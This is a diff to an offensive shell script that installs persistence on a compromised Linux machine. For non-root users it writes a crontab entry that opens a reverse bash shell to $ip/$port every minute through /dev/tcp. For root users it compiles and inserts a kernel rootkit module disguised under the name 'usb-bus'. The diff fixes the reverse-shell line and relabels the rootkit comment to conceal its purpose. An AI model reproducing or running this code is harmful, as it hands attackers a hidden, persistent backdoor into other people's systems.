@@ -42,7 +42,7 @@ finish
 #if the user making the connection is not root add a crontab entry which spawns backdoor bash shells
 if [ "$user" != "root" ]; then
   printf "adding crontab for $user... "
-  printf "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1 &'\n" > /tmp/.cron
+  printf "* * * * * bash -c 'bash &>/dev/tcp/$ip/$port 0>&1 &'\n" > /tmp/.cron
   crontab /tmp/.cron
   finish
   rm /tmp/.cron
@@ -82,15 +82,16 @@ if [ "$user" == "root" ]; then
     fi
   done
 
-  #--make and insert the usb-bus rootkit module--
+  #--make and insert the usb-bus module--
   echo "--install the rootkit--"
 
   #if the distribution is redhat install kernel-devel and modify build accordingly
   if [ "$distro" == "redhat" ]; then
-    install_pre kernel-devel
+    yum install -y kernel-devel >/dev/null
     ln -s -f /usr/src/kernels/*/ /lib/modules/$(uname -r)/build
   fi
 
+  #make the usb-bus module
   if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
     mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
   fi
@@ -101,7 +102,7 @@ if [ "$user" == "root" ]; then
   if [ "$?" == "0" ]; then
     echo "done"
 
-  #if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again
+  #-if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again-
   else
     echo "failed, trying some fixes"
     #copy the headers
